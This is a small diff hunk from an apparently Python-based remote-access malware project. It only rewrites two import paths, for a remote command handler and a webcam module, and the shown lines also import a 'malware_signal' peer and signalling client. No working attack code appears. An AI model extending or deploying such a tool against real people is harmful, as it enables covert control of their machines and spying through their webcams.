@@ -3,8 +3,8 @@ import asyncio
 from core.data.client import client_id, username
 from core.data.config import ROOM, HOST
 from malware_signal.signal import SignalClient
-from injection_utils.remote_command_handler import RemoteCommandHandler as ReceiverHandler
-from media.web_cam import WebCam
+from tools.injection_utils.remote_command_handler import RemoteCommandHandler as ReceiverHandler
+from tools.media.web_cam import WebCam
 from malware_signal.peer import Peer
 
 async def listen_bash_mode():
